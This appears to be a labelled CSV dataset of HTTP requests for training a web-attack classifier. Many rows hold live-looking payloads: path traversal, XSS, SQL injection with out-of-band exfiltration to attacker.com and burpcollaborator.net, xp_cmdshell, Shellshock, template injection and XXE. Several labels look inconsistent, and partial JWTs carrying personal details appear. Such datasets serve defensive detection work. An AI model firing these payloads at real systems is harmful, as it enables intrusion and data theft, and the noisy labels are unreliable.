method,path,query,headers,body,ua,label
GET,/assets/script-tag-2befZuvx.js,file=../../../../etc/passwd,,HTTP/1.1,,1
GET,<body onload=alert(1)>,,,,,1
GET,/,,,,,0
GET,%0als,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,|getent+hosts+somehost.burpcollaborator.net.&,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/assets/octagon-alert-7zrgUous.css,,,HTTP/1.1,,0
GET,/,<svg/onload=alert(=RND=)//,,,,1
GET,../../../../etc/passwd,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
,/index.html,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,0
GET,/assets/octagon-alert-7zrgUous.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,"""OnCliCk=""(prompt`1`)",,,,1
POST,/login,,,Content-Type: application/x-www-form-urlencoded user=john&pass=doe,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
POST,/,,,{{1337*1338}},,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/id,token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NzIzNTEwMzcsImlhdCI6MTc3MjA5MTgzNywidXNlciI6eyJzZXNzaW9uX2lkIjoiMDE5Yzk4ZTctOGFjMi03Mjc0LWFkM2EtMmRiNzFhZTYzZThlIiwic291cmNlIjoiQk8iLCJzdGFmZl9jb2RlIjoibGluaGxoMiIsInVzZXJfZW1haWwiOiJsaW5obGgyQHZucGF5LnZuIiwidXNlcl9mdWxsX25hbWUiOiJMaW5oIEzDqiBIw,,,,0
GET,/,<svg%0Aonauxclick=0;[1].some(confirm)//,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
POST,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*","{""__proto__"": {""isAdmin"": true}}",,1
GET,/,token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NzIxODE2MDMsImlhdCI6MTc3MTkyMjQwMywidXNlciI6eyJncm91cF9pZCI6IjAxOWMwZTZlLWI0YTctNzRjYS05MGNlLTUyY2M0Njg5MzZjZSIsImxlYWRlcl9pZCI6IjAxOWMwOWU0LTNmY2QtNzc2ZS05ZGUwLWFiZGYyZjI3ZTYwMyIsInNlc3Npb25faWQiOiIwMTljOGVjZS0zMTkyLTc4MjQtYTI1OS0zZDZmM2JhM2NkM,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/api/v1/products/101,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
GET,"prompt.call(null,1)",,,,,1
GET,; cat /et'c/pa'ss'wd,,,,,1
,/favicon.ico,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,0
,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/admin/users,limit=20&offset=40,,,,0
GET,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
,/index.html,,,,,0
GET,/,,,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,0
GET,/,,,,,0
GET,`curl -L http://ⒼⓄⓄⒼⓁⒺ.ⒸⓄⓂ`,,,,,1
POST,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*","{""alg"":""none""}",,1
GET,/search,q=machine+learning,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,%0d%0a* CAPABILITY,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/assets/octagon-alert-7zrgUous.js,q=%3Cscript%3E%3C/script%3E,,HTTP/1.1,,1
GET,123) AND 12=12 AND JSON_DEPTH('{}') != 2521,,,,,1
POST,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*","{""alg"":""none""}",,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,id=1&id=2,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/assets/octagon-alert-7zrgUous.js,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
,/index.html,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,0
GET,/static/js/select.min.js,,,HTTP/1.1,,0
GET,admin*)(| (password=*)),,,,,1
GET,/,|getent+hosts+somehost.burpcollaborator.net.&,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY data SYSTEM ""netdoc:/et c/passwd"">]><foo>&data;</foo>",,,,,1
GET,id=1; SELECT pg_sleep(5)--,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,"<j id=x style=""-webkit-user-modify:read-write"" onfocus={window.onerr or=eval}throw/0/+name>H</j>#x",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,../../../../etc/passwd,,,,,1
GET,<img src onerror=confirm(1)>,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
,/robots.txt,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,0
GET,cat /etc/passwd,,,,,1
GET,/,,,,,0
GET,/uploads/628668cae9db4d51b4edf55214b73fca-Facebook Image.jpg?response-content-disposition=inline%3B%20filename%2A%3DUTF-8%27%276b67c704b68a4517aa6664c1df2f7afe&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=9wnmzzHYVGwlnTscRdzx%2F20260310%2F%2Fs3%2Faws4_request&X-Amz-Date=20260310T023341Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=5bfffbe1cc40d1ef12ee72b2126381daf34408143c87a1c0bf11e66c162e101b&q=%3Cscript%3E%3C/script%3E,,,,,1
GET,/,,,,,0
,/favicon.ico,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,0
GET,/,%22onauxclick=alert`xss`+a,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,I would like to request information about the idv_msdb database.,,,,,0
GET,h2<h1,,,,,0
GET,/,,,,,0
GET,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,<<scr�ipt/src=http://xss.com/xss.js></script,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,?34ea04b04c=%3CIMG%20SRC=j&%23X41vascript:alert%28%27test%27%29%3E,,,,1
,/api/health,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,0
GET,/,dc1e09adea=%3Cimg%20src=x%20onerror=alert%28document.domain%29%3E%2Fall,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,../../../../etc/passwd,,,,,1
GET,/,,,,,0
GET,"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""i d"")}",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
POST,/api/upload,,,"{""filename"": ""image.png"", ""data"": ""iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==""}",,0
GET,/,/insky/projects/bce0a79c-90d2-4558-9084-945ad6acbdae/issues/?db=monasca&q=SELECT%20mean(%22value%22)%20FROM%20%22mem.used_perc%22%20WHERE%20%22resource_id%22%20%3D~%20%2F%5Ebfb959fd-8128-4a68-98c7-d062ebd2dc4b%2F%20AND%20time%20%3E%3D%20now()%20-%206h%20and%20time%20%3C%3D%20now()%20GROUP%20BY%20time(1m)%2C%20resource_id&epoch=ms,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
GET,/static/js/alert.min.js,,,HTTP/1.1,,0
GET,"', $or: [ {}, { 'order':'order",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,?4cbb3ffb50=3%3B%2F%2A%20a%20%2A%2F%20DECLARE%20@c%20varchar%28255%29%3B%2F%2A%20b%20%2A%2FSELECT%20@c=%27ping%20%27+master.sys.fn_varbintohexstr%28convert%28varbinary%2CSYSTEM_USER%29%29+%27.000.burpcol%27+%27laborator.net%27%3B%2F%2Axx%2A%2F%20EXEC%20Master.dbo.xp_cmdshell%20@c%3B%2F%2Axxx%2A%2F%20EXEC%20sp_SYS_ProtoOp%20@id=3,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/,"(xss""><!--><svg/onload=alert(document.domain)>)",,,,1
GET,/,,,,,0
GET,/assets/octagon-alert-7zrgUous.css,,,HTTP/1.1,,0
GET,../../../../etc/passwd,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/js/components/AlertDialog.js,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/ws/notifications,,,(Upgrade: websocket),,0
GET,/,?f24f266870=%3Cj%20id=x%20style=%22-webkit-user-modify:read-write%22%20onfocus=%7Bwindow.onerror=eval%7Dthrow%2F0%2F+name%3EH%3C%2Fj%3E%23x,,,,1
,/api/health,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,0
GET,/products,category=electronics&brand=apple,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,/insky/projects/bce0a79c-90d2-4558-9084-945ad6acbdae/issues/?db=monasca&q=SELECT%20mean(%22value%22)%20FROM%20%22mem.used_perc%22%20WHERE%20%22resource_id%22%20%3D~%20%2F%5Ebfb959fd-8128-4a68-98c7-d062ebd2dc4b%2F%20AND%20time%20%3E%3D%20now()%20-%206h%20and%20time%20%3C%3D%20now()%20GROUP%20BY%20time(1m)%2C%20resource_id&epoch=ms,,,,1
GET,0;var date=new Date(); do{curDate = new Date();}while(curDate-date<1 0000),,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,php://filter/convert.base64-encode/resource=index.php,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,url=/?usr=subject;-,,,,0
GET,/,,,,,0
,/index.html,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,0
GET,' or '1'='1,,,,,1
GET,"id=1 UNION SELECT null, user(), database()--",,,,,1
GET,"<!--#exec cmd=""ls"" -->",,,,,1
GET,/,userPassword:2.5.13.18:=123,,,,1
GET,"alert.apply(null, [1])",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,${os.system('id')},,,,,1
GET,curl and divergence,,,,,0
GET,/,,,,,0
GET,/assets/octagon-alert-7zrgUous.css,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/js/components/AlertDialog.js,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/,,,,,0
,/robots.txt,,,,,0
GET,/,,,,,0
POST,/user/password-update,,,"{""old"": ""pass1"", ""new"": ""pass2""}",,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,../../../../etc/passwd%00,,,,,1
GET,/,,,,,0
GET,/products,category=electronics&brand=apple,,,,0
GET,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
,/robots.txt,,,,,0
POST,/privacy/consent,,,"{""analytics"": true, ""marketing"": false}",,0
GET,/blog/future-of-ai-2026,,,,,0
GET,/assets/octagon-alert-7zrgUous.js,q=%3Cscript%3E%3C/script%3E,,HTTP/1.1,,1
GET,/Rnj7kZj.jpeg?q=%3Cx/Onpointerrawupdate=confirm%26lpar;)%3Exxxxx 109. Attack_PDF_1: 210 malicious requests have bypassed the security solution Payload Test case Encoder Placeholder Status RCPT TO: test@evil.com,,,,,1
GET,/static/js/select.min.js,"id=1%20UNION%20SELECT%201,2,3",,HTTP/1.1,,1
GET,/assets/octagon-alert-7zrgUous.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,,,,0
GET,------------------------------------------,,,,,1
GET,/,,,,,0
GET,cat /etc/passwd,,,,,1
GET,/search,q=C%23,,,,0
GET,/assets/octagon-alert-7zrgUous.js,,,HTTP/1.1,,0
,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,0
GET,The standard for the <$ tag is to enclose text or code that should b e interpreted as a dollar amount.,,,,,0
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,,,,0
GET,D'or 1st parfume,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,union select,,,,,1
GET,java\tscript:alert(1),,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
,/api/health,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,0
GET,/,?4cbb3ffb50=3%3B%2F%2A%20a%20%2A%2F%20DECLARE%20@c%20varchar%28255%29%3B%2F%2A%20b%20%2A%2FSELECT%20@c=%27ping%20%27+master.sys.fn_varbintohexstr%28convert%28varbinary%2CSYSTEM_USER%29%29+%27.000.burpcol%27+%27laborator.net%27%3B%2F%2Axx%2A%2F%20EXEC%20Master.dbo.xp_cmdshell%20@c%3B%2F%2Axxx%2A%2F%20EXEC%20sp_SYS_ProtoOp%20@id=3,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/assets/octagon-alert-7zrgUous.css,,,HTTP/1.1,,0
GET,javascript:setInterval('prom'+'pt(document.domain)'),,,,,1
POST,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",{{7*7}} or {{config.items()}},,1
GET,;var date = new Date(); do{curDate = new Date();}while(curDate-date,,,,,1
GET,expect://id,,,,,1
GET,/,"""//Onx=""""//onfocus=prompt(1)>","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,,,,0
GET,; /bin/c?t /e*c/p?sswd,,,,,1
POST,/,,,"{""$gt"": """"}",,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,<img src=x onerror=alert(1)>,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,php://input,,,,,1
GET,/admin/users,limit=20&offset=40,,,,0
GET,/,,,,,0
GET,"""><svg onmouseover=""confirm&#0000000040document.domain)",,,,,1
GET,/,,,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,0
GET,/,token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NzIxODE2MDMsImlhdCI6MTc3MTkyMjQwMywidXNlciI6eyJncm91cF9pZCI6IjAxOWMwZTZlLWI0YTctNzRjYS05MGNlLTUyY2M0Njg5MzZjZSIsImxlYWRlcl9pZCI6IjAxOWMwOWU0LTNmY2QtNzc2ZS05ZGUwLWFiZGYyZjI3ZTYwMyIsInNlc3Npb25faWQiOiIwMTljOGVjZS0zMTkyLTc4MjQtYTI1OS0zZDZmM2JhM2NkM,,,,0
GET,<script>aaa</script>,,,,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,,,,0
GET,"<!DOCTYPE x SYSTEM ""//x/x"" > <x>a</x>",,,,,1
POST,/logs/client,,,"{""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,0
GET,/,?e804afb6a1=%3Cj%20id=x%20style=%22-webkit-user-modify:read-write%22%20onfocus=%7Bwindow.onerror=eval%7Dthrow%2F0%2F+name%3EH%3C%2Fj%3E%23x,,,,1
GET,/,?d7f86bf74f=123%29%20AND%2012=12%20%20AND%20JSON_DEPTH%28%27%7B%7D%27%29%20%21=%202521,,,,1
GET,/admin/dashboard/users/active,,,,,0
POST,/,,,"{""$gt"": """"}",,1
GET,"<?xml version=""1.0"" encoding=""utf-8"" standalone=""no"" ?><x xmlns:xsi =""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""htt p://xxe-xsi-schemalocation.yourdomain[.]com/""/>",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/assets/octagon-alert-7zrgUous.css,,,HTTP/1.1,,0
GET,/,<svg%0Aonauxclick=0;[1].some(confirm)//,,,,1
